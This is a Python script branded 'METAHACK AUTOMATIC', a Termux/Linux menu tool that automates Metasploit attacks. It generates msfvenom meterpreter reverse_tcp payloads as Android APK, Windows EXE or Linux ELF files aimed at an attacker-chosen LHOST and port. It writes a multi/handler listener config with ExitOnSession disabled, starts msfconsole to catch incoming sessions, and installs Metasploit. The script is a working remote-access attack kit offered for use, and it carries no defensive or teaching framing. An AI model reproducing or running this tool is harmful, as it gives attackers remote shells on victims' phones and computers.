#!/usr/bin/env python3
import os
import sys
import shutil
import subprocess
from time import sleep

# ANSI Colors
class Style:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

# Visual Banner
def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{Style.BOLD}{Style.CYAN}
        .o oOOOOOOOo                                            OOOo
        Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
        OboO\"\"\"\"\"\"\"\"\"\"\".OOo. .oOOOOOo.    OOOo.oOOOOOo..\"\"\"\"\"\"\"'OO
        OOP.oOOOOOOOOOOO \"POOOOOOOOOOOo.   `\"OOOOOOOOOP,OOOOOOOOOOOB'
        `O'OOOO'     `OOOOo\"OOOOOOOOOOO` .adOOOOOOOOO\"oOOO'    `OOOOo
        .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
        OOOOO                 '\"OOOOOOOOOOOOOOOO\"`                oOO
       oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
      oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
     OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO\"`  '\"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
     \"OOOO\"       \"YOoOOOOMOIONODOO\"`  .   '\"OOROAOPOEOOOoOY\"     \"OOO\"
        Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
        :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
        .            oOOP\"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO\"OOo
                     '%o  OOOO\"%OOOO%\"%OOOOO\"OOOOOO\"OOO':
                          `$\"  `OOOO' `O\"Y ' `OOOO'  o             .
        .                  .     OP\"          : o     .
                                 :
    {Style.RESET}{Style.BOLD}{Style.RED}☠️  M E T A H A C K   A U T O M A T I C  ☠️{Style.RESET}
    {Style.YELLOW}============================================
     {Style.CYAN}By: H4CK3R - Termux/Linux | v2.0
     {Style.YELLOW}============================================{Style.RESET}
""")

# Pause with ENTER
def pause():
    input(f"{Style.CYAN}[!] Press ENTER to continue...{Style.RESET}")

# Check dependencies
def check_dependencies():
    required = ['msfvenom', 'msfconsole', 'ruby']
    missing = [tool for tool in required if not shutil.which(tool)]
    
    if missing:
        print(f"{Style.RED}[-] Missing tools: {', '.join(missing)}{Style.RESET}")
        print(f"{Style.YELLOW}[i] Use option 3 to install in Termux{Style.RESET}")
        pause()
        return False
    return True

# Create payloads
def create_payload():
    show_banner()
    print(f"{Style.GREEN}[+] Payload Generation{Style.RESET}")
    print(f"{Style.BLUE}1.{Style.RESET} Android")
    print(f"{Style.BLUE}2.{Style.RESET} Windows")
    print(f"{Style.BLUE}3.{Style.RESET} Linux")
    print(f"{Style.BLUE}4.{Style.RESET} Back")

    choice = input(f"{Style.YELLOW}[?] Select type (1-4): {Style.RESET}")
    if choice == "4":
        return

    payload_types = {
        "1": ("android/meterpreter/reverse_tcp", ".apk"),
        "2": ("windows/meterpreter/reverse_tcp", ".exe"),
        "3": ("linux/x86/meterpreter/reverse_tcp", ".elf")
    }

    if choice not in payload_types:
        print(f"{Style.RED}[-] Invalid choice!{Style.RESET}")
        sleep(1)
        return

    payload, ext = payload_types[choice]
    lhost = input(f"{Style.YELLOW}[?] LHOST (IP/DNS): {Style.RESET}")
    lport = input(f"{Style.YELLOW}[?] LPORT (default 4444): {Style.RESET}") or "4444"
    name = input(f"{Style.YELLOW}[?] Output filename (without extension): {Style.RESET}")

    output_file = f"{name}{ext}"
    cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output_file}"
    
    print(f"{Style.CYAN}[*] Generating payload...{Style.RESET}")
    os.system(cmd)
    
    if os.path.exists(output_file):
        print(f"{Style.GREEN}[✓] Payload saved as: {output_file}{Style.RESET}")
        
        # Create listener file
        with open("listener.rc", "w") as f:
            f.write(f"use exploit/multi/handler\n")
            f.write(f"set payload {payload}\n")
            f.write(f"set LHOST {lhost}\n")
            f.write(f"set LPORT {lport}\n")
            f.write("set ExitOnSession false\n")
            f.write("exploit -j\n")
        
        print(f"{Style.GREEN}[✓] Listener config saved as listener.rc{Style.RESET}")
        print(f"{Style.YELLOW}[i] Start listener with option 2 from main menu{Style.RESET}")
    else:
        print(f"{Style.RED}[-] Failed to generate payload!{Style.RESET}")
    
    pause()

# Start Metasploit
def start_metasploit():
    if not check_dependencies():
        return
    
    show_banner()
    print(f"{Style.GREEN}[+] Metasploit Console{Style.RESET}")
    print(f"{Style.BLUE}1.{Style.RESET} Start with listener.rc")
    print(f"{Style.BLUE}2.{Style.RESET} Start clean session")
    print(f"{Style.BLUE}3.{Style.RESET} Back")
    
    choice = input(f"{Style.YELLOW}[?] Select option (1-3): {Style.RESET}")
    
    if choice == "1":
        if os.path.exists("listener.rc"):
            os.system("msfconsole -r listener.rc")
        else:
            print(f"{Style.RED}[-] listener.rc not found!{Style.RESET}")
            print(f"{Style.YELLOW}[i] Create a payload first to generate listener.rc{Style.RESET}")
    elif choice == "2":
        os.system("msfconsole")
    elif choice == "3":
        return
    else:
        print(f"{Style.RED}[-] Invalid choice!{Style.RESET}")
    
    pause()

# Install requirements in Termux
def install_termux():
    show_banner()
    print(f"{Style.GREEN}[+] Termux Installation{Style.RESET}")
    print(f"{Style.BLUE}1.{Style.RESET} Install Metasploit (Full)")
    print(f"{Style.BLUE}2.{Style.RESET} Install Lightweight Ruby")
    print(f"{Style.BLUE}3.{Style.RESET} Back")
    
    choice = input(f"{Style.YELLOW}[?] Select option (1-3): {Style.RESET}")
    
    if choice == "1":
        print(f"{Style.YELLOW}[~] Installing Metasploit (this may take a while)...{Style.RESET}")
        os.system("pkg update -y && pkg upgrade -y")
        os.system("pkg install curl wget -y")
        os.system("pkg install unstable-repo -y")
        os.system("pkg install metasploit -y")
        print(f"{Style.GREEN}[✓] Metasploit installed!{Style.RESET}")
    elif choice == "2":
        print(f"{Style.YELLOW}[~] Installing lightweight Ruby...{Style.RESET}")
        os.system("pkg update -y && pkg install ruby -y")
        os.system("gem install bundler")
        print(f"{Style.GREEN}[✓] Ruby installed!{Style.RESET}")
    elif choice == "3":
        return
    else:
        print(f"{Style.RED}[-] Invalid choice!{Style.RESET}")
    
    pause()

# Show system information
def show_info():
    show_banner()
    print(f"{Style.GREEN}[+] System Information{Style.RESET}")
    print(f"{Style.CYAN}OS:{Style.RESET} {os.uname().sysname}")
    print(f"{Style.CYAN}Architecture:{Style.RESET} {os.uname().machine}")
    print(f"{Style.CYAN}Hostname:{Style.RESET} {os.uname().nodename}")
    
    # Check Metasploit version
    try:
        msf_version = subprocess.getoutput("msfconsole --version")
        print(f"{Style.CYAN}Metasploit:{Style.RESET} {msf_version.splitlines()[0]}")
    except:
        print(f"{Style.CYAN}Metasploit:{Style.RESET} {Style.RED}Not installed{Style.RESET}")
    
    # Check Ruby version
    try:
        ruby_version = subprocess.getoutput("ruby --version")
        print(f"{Style.CYAN}Ruby:{Style.RESET} {ruby_version.split()[1]}")
    except:
        print(f"{Style.CYAN}Ruby:{Style.RESET} {Style.RED}Not installed{Style.RESET}")
    
    pause()

# Main menu
def main():
    while True:
        show_banner()
        print(f"{Style.BLUE}1.{Style.RESET} Create Payload")
        print(f"{Style.BLUE}2.{Style.RESET} Start Metasploit")
        print(f"{Style.BLUE}3.{Style.RESET} Install in Termux")
        print(f"{Style.BLUE}4.{Style.RESET} System Info")
        print(f"{Style.BLUE}5.{Style.RESET} Exit")

        choice = input(f"{Style.YELLOW}[?] Select option (1-5): {Style.RESET}")
        
        if choice == "1":
            create_payload()
        elif choice == "2":
            start_metasploit()
        elif choice == "3":
            install_termux()
        elif choice == "4":
            show_info()
        elif choice == "5":
            print(f"{Style.RED}[!] Exiting...{Style.RESET}")
            sys.exit()
        else:
            print(f"{Style.RED}[-] Invalid option!{Style.RESET}")
            sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Style.RED}[!] Script interrupted by user{Style.RESET}")
        sys.exit(0)
